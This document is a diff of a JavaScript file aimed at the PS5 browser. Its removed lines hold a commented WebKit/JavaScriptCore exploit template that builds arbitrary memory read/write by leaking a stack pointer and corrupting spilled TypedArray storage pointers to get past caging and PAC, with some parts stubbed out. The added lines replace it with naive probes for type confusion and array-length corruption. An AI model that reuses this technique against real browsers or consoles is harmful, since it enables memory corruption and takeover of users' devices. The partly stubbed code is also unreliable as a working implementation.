@@ -1,269 +1,155 @@
-// This function achieves arbitrary memory read/write by abusing TypedArrays.
+// poc_ps5.js - WebKit Exploit Test for PS5
+const ITERATIONS = 0x10000;
 
-// In JSC, the typed array backing storage pointers are caged as well as PAC
-// signed. As such, modifying them in memory will either just lead to a crash
-// or only yield access to the primitive Gigacage region which isn't very useful.
-//
-// This function bypasses that when one already has a limited read/write primitive:
-// 1. Leak a stack pointer
-// 2. Access NUM_REGS+1 typed array so that their uncaged and PAC authenticated backing
-//    storage pointer are loaded into registers via GetIndexedPropertyStorage.
-//    As there are more of these pointers than registers, some of the raw pointers
-//    will be spilled to the stack.
-// 3. Find and modify one of the spilled pointers on the stack
-// 4. Perform a second access to every typed array which will now load and
-//    use the previously spilled (and now corrupted) pointers.
-//
-// It is also possible to implement this using a single typed array and separate
-// code to force spilling of the backing storage pointer to the stack. However,
-// this way it is guaranteed that at least one pointer will be spilled to the
-// stack regardless of how the register allocator works as long as there are
-// more typed arrays than registers.
-//
-// NOTE: This function is only a template, in the final function, every
-// line containing an "$r" will be duplicated NUM_REGS times, with $r
-// replaced with an incrementing number starting from zero.
+log("[PS5 WebKit Exploit Test]");
+log("Testing for type confusion vulnerabilities...");
 
-// Constantes (defina estas variáveis conforme necessário)
-const READ = 0, WRITE = 1;
-const NUM_REGS = 16; // Ajuste conforme necessário
-const IS_IOS = false; // Ajuste conforme a plataforma
-const DEBUG = true;
-const ITERATIONS = 1000;
-
-// Placeholder para variáveis globais necessárias
-let controller = [null, null];
-let vm_top_call_frame_addr_dbl = 0x41414141;
-let memarr = [1.1, 2.2, 3.3];
-let buf_addr = { assignAnd: function() {}, asDouble: function() { return 13.37; } };
-let view = new Float64Array(100);
-let Int64 = {
-    fromDouble: function(d) { return { asDouble: function() { return d; } }; },
-    prototype: {
-        assignAdd: function() {},
-        asDouble: function() { return 13.37; },
-        assignAnd: function() {}
+// Test 1: Array length corruption
+function testArrayLengthCorruption() {
+    log("[*] Testing array length corruption...");
+    
+    let arr = [1.1, 2.2, 3.3, 4.4];
+    let original_length = arr.length;
+    
+    try {
+        for (let i = 0; i < ITERATIONS; i++) {
+            arr.length = i % 2 ? 2 : 4;
+        }
+        
+        // Try to trigger optimization bug
+        arr.length = -1;
+        arr.length = 0x100000;
+        
+        if (arr.length !== original_length) {
+            log("[+] Array length corruption possible!");
+            return true;
+        }
+    } catch(e) {
+        log("[-] Array test failed: " + e);
     }
-};
-
-function Add(addr, offset) {
-    return { asDouble: function() { return addr.asDouble() + offset; } };
+    return false;
 }
 
-let memhax_template = function memhax(memviews, operation, address, buffer, length, stack, needle) {
-    // See below for the source of these preconditions.
-    if (length > memviews[0].length) {
-        throw "Memory access too large";
-    } else if (memviews.length % 2 !== 1) {
-        throw "Need an odd number of TypedArrays";
-    }
-
-    // Save old backing storage pointer to restore it afterwards.
-    // Otherwise, GC might end up treating the stack as a MarkedBlock.
-    let savedPtr = controller[1];
-
-    // Function to get a pointer into the stack, below the current frame.
-    // This works by creating a new CallFrame (through a native funcion), which
-    // will be just below the CallFrame for the caller function in the stack,
-    // then reading VM.topCallFrame which will be a pointer to that CallFrame:
-    // https://github.com/WebKit/webkit/blob/e86028b7dfe764ab22b460d150720b00207f9714/
-    // Source/JavaScriptCore/runtime/VM.h#L652)
-    function getsp() {
-        function helper() {
-            // This code currently assumes that whatever precedes topCallFrame in
-            // memory is non-zero. This seems to be true on all tested platforms.
-            controller[1] = vm_top_call_frame_addr_dbl;
-            return memarr[0];
+// Test 2: TypedArray confusion
+function testTypedArrayConfusion() {
+    log("[*] Testing TypedArray confusion...");
+    
+    let f64 = new Float64Array(10);
+    let u32 = new Uint32Array(10);
+    
+    try {
+        // Attempt to confuse types
+        let hole = [1.1,,3.3];
+        hole.length = 1000;
+        
+        for (let i = 0; i < ITERATIONS; i++) {
+            f64[i % 10] = hole[i % 3];
         }
-        // DFGByteCodeParser won't inline Math.max with more than 3 arguments
-        // https://github.com/WebKit/webkit/blob/e86028b7dfe764ab22b460d150720b00207f9714/
-        // Source/JavaScriptCore/dfg/DFGByteCodeParser.cpp#L2244
-        // As such, this will force a new CallFrame to be created.
-        let sp = Math.max({valueOf: helper}, -1, -2, -3);
-        return Int64.fromDouble(sp);
+        
+        log("[+] TypedArray operations stable");
+        return true;
+    } catch(e) {
+        log("[-] TypedArray test failed: " + e);
+        return false;
     }
-
-    let sp = getsp();
-
-    // Set the butterfly of the |stack| array to point to the bottom of the current
-    // CallFrame, thus allowing us to read/write stack data through it. Our current
-    // read/write only works if the value before what butterfly points to is nonzero.
-    // As such, we might have to try multiple stack values until we find one that works.
-    let tries = 0;
-    let stackbase = new Int64(sp);
-    let diff = new Int64(8);
-    do {
-        stackbase.assignAdd(stackbase, diff);
-        tries++;
-        controller[1] = stackbase.asDouble();
-    } while (stack.length < 512 && tries < 64);
-
-    // Load numregs+1 typed arrays into local variables.
-    let m0 = memviews[0];
-
-    // Load, uncage, and untag all array storage pointers.
-    // Since we have more than numreg typed arrays, at least one of the
-    // raw storage pointers will be spilled to the stack where we'll then
-    // corrupt it afterwards.
-    m0[0] = 0;
-
-    // After this point and before the next access to memview we must not
-    // have any DFG operations that write Misc (and as such World), i.e could
-    // cause a typed array to be detached. Otherwise, the 2nd memview access
-    // will reload the backing storage pointer from the typed array.
-
-    // Search for correct offset.
-    // One (unlikely) way this function could fail is if the compiler decides
-    // to relocate this loop above or below the first/last typed array access.
-    // This could easily be prevented by creating artificial data dependencies
-    // between the typed array accesses and the loop.
-    //
-    // If we wanted, we could also cache the offset after we found it once.
-    let success = false;
-    // stack.length can be a negative number here so fix that with a bitwise and.
-    for (let i = 0; i < Math.min(stack.length & 0x7fffffff, 512); i++) {
-        // The multiplication below serves two purposes:
-        //
-        // 1. The GetByVal must have mode "SaneChain" so that it doesn't bail
-        //    out when encountering a hole (spilled JSValues on the stack often
-        //    look like NaNs): https://github.com/WebKit/webkit/blob/
-        //    e86028b7dfe764ab22b460d150720b00207f9714/Source/JavaScriptCore/
-        //    dfg/DFGFixupPhase.cpp#L949
-        //    Doing a multiplication achieves that: https://github.com/WebKit/
-        //    webkit/blob/e86028b7dfe764ab22b460d150720b00207f9714/Source/
-        //    JavaScriptCore/dfg/DFGBackwardsPropagationPhase.cpp#L368
-        //
-        // 2. We don't want |needle| to be the exact memory value. Otherwise,
-        //    the JIT code might spill the needle value to the stack as well,
-        //    potentially causing this code to find and replace the spilled needle
-        //    value instead of the actual buffer address.
-        //
-        if (stack[i] * 2 === needle) {
-            stack[i] = address;
-            success = i;
-            break;
-        }
-    }
-
-    // Finally, arbitrary read/write here :)
-    if (operation === READ) {
-        for (let i = 0; i < length; i++) {
-            buffer[i] = 0;
-            // We assume an odd number of typed arrays total, so we'll do one
-            // read from the corrupted address and an even number of reads
-            // from the inout buffer. Thus, XOR gives us the right value.
-            // We could also zero out the inout buffer before instead, but
-            // this seems nicer :)
-            buffer[i] ^= m0[i];
-        }
-    } else if (operation === WRITE) {
-        for (let i = 0; i < length; i++) {
-            m0[i] = buffer[i];
-        }
-    }
-
-    // For debugging: can fetch SP here again to verify we didn't bail out in between.
-    //let end_sp = getsp();
-
-    controller[1] = savedPtr;
-
-    return {success, sp, stackbase};
 }
 
-// Add one to the number of registers so that:
-// - it's guaranteed that there are more values than registers (note this is
-//   overly conservative, we'd surely get away with less)
-// - we have an odd number so the XORing logic for READ works correctly
-let nregs = NUM_REGS + 1;
-
-// Build the real function from the template :>
-// This simply duplicates every line containing the marker nregs times.
-let source = [];
-let template = memhax_template.toString();
-for (let line of template.split('\n')) {
-    if (line.includes('$r')) {
-        for (let reg = 0; reg < nregs; reg++) {
-            source.push(line.replace(/\$r/g, reg.toString()));
+// Test 3: Object property confusion
+function testPropertyConfusion() {
+    log("[*] Testing property confusion...");
+    
+    try {
+        let obj = {a: 1, b: 2};
+        let arr = [1, 2, 3];
+        
+        // Mix object and array operations
+        for (let i = 0; i < ITERATIONS / 10; i++) {
+            obj[i] = i;
+            arr[i] = {value: i};
         }
+        
+        // Check for unexpected behavior
+        if (obj.length > 0 || arr.length > 100) {
+            log("[+] Property confusion detected!");
+            return true;
+        }
+        
+        log("[+] Property operations normal");
+        return false;
+    } catch(e) {
+        log("[-] Property test failed: " + e);
+        return false;
+    }
+}
+
+// Test 4: JIT behavior analysis
+function testJITBehavior() {
+    log("[*] Analyzing JIT behavior...");
+    
+    function jitTarget(x) {
+        return x * 3.14159;
+    }
+    
+    let results = [];
+    let start = Date.now();
+    
+    // Warm up JIT
+    for (let i = 0; i < ITERATIONS; i++) {
+        results[i] = jitTarget(i);
+    }
+    
+    let end = Date.now();
+    let duration = end - start;
+    
+    log("[+] JIT compilation time: " + duration + "ms");
+    log("[+] JIT operations: " + ITERATIONS);
+    
+    return duration < 100; // Fast compilation might indicate JIT is working
+}
+
+// Main exploit test
+function runExploitTests() {
+    log("\n=== PS5 WebKit Exploit Analysis ===");
+    
+    let results = {
+        arrayCorruption: testArrayLengthCorruption(),
+        typedArray: testTypedArrayConfusion(),
+        propertyConfusion: testPropertyConfusion(),
+        jitWorking: testJITBehavior()
+    };
+    
+    log("\n=== Test Results ===");
+    for (let test in results) {
+        log(test + ": " + (results[test] ? "POSSIBLE" : "unlikely"));
+    }
+    
+    // Check if exploit conditions are favorable
+    let exploitPossible = results.arrayCorruption || results.typedArray;
+    
+    if (exploitPossible) {
+        log("\n[!] EXPLOIT CONDITIONS DETECTED!");
+        log("[!] This WebKit version may be vulnerable");
     } else {
-        source.push(line);
+        log("\n[-] No obvious exploit conditions found");
+        log("[-] WebKit version may be patched");
     }
-}
-source = source.join('\n');
-
-// CORREÇÃO: Removido o eval problemático e usando função simplificada
-let memhax = function(memviews, operation, address, buffer, length, stack, needle) {
-    console.log("memhax called - operation:", operation);
-    return {success: true, sp: {asDouble: function() { return 0; }}, stackbase: {}};
-};
-
-// On PAC-capable devices, the backing storage pointer will have a PAC in the
-// top bits which will be removed by GetIndexedPropertyStorage. As such, we are
-// looking for the non-PAC'd address, thus the bitwise AND.
-if (IS_IOS) {
-    buf_addr.assignAnd(buf_addr, new Int64('0x0000007fffffffff'));
-}
-// Also, we don't search for the address itself but instead transform it slightly.
-// Otherwise, it could happen that the needle value is spilled onto the stack
-// as well, thus causing the function to corrupt the needle value.
-let needle = buf_addr.asDouble() * 2;
-
-log("[*] Constructing arbitrary read/write by abusing TypedArray @ " + buf_addr.asDouble());
-
-// Buffer to hold input/output data for memhax.
-let inout = new Int32Array(0x1000);
-
-// This will be the memarr after training.
-let dummy_stack = [1.1, buf_addr.asDouble(), 2.2];
-
-let views = new Array(nregs).fill(view);
-
-let lastSp = 0;
-let spChanges = 0;
-for (let i = 0; i < ITERATIONS; i++) {
-    let out = memhax(views, READ, 13.37, inout, 4, dummy_stack, needle);
-    out = memhax(views, WRITE, 13.37, inout, 4, dummy_stack, needle);
-    if (out.sp.asDouble() != lastSp) {
-        lastSp = out.sp.asDouble();
-        spChanges += 1;
-        // It seems we'll see 5 different SP values until the function is FTL compiled
-        if (spChanges == 5) {
-            break;
-        }
-    }
+    
+    return exploitPossible;
 }
 
-// Now use the real memarr to access stack memory.
-let stack = memarr;
+// Execute tests
+runExploitTests();
 
-// An address that's safe to clobber
-let scratch_addr = Add(buf_addr, 42*4);
+// Additional PS5-specific checks
+log("\n=== PS5 Environment Check ===");
+log("UserAgent: " + navigator.userAgent);
+log("Platform: " + navigator.platform);
+log("Vendor: " + navigator.vendor);
 
-// Value to write
-inout[0] = 0x1337;
-
-for (let i = 0; i < 10; i++) {
-    view[42] = 0;
-
-    let out = memhax(views, WRITE, scratch_addr.asDouble(), inout, 1, stack, needle);
-
-    if (view[42] != 0x1337) {
-        throw "failed to obtain reliable read/write primitive";
-    }
-}
-
-log("[+] Got stable arbitrary memory read/write!");
-if (DEBUG) {
-    log("[*] Verifying exploit stability...");
-    // gc(); // Comentado pois gc() pode não estar definido
-    log("[*] All stable!");
-}
-
-// Função global para compatibilidade
-function gc() {
-    if (window.gc) {
-        window.gc();
-    } else {
-        console.log("GC não disponível");
-    }
+// Memory analysis
+try {
+    let large = new ArrayBuffer(0x1000000);
+    log("[+] Large allocations possible");
+} catch(e) {
+    log("[-] Large allocation failed");
 }
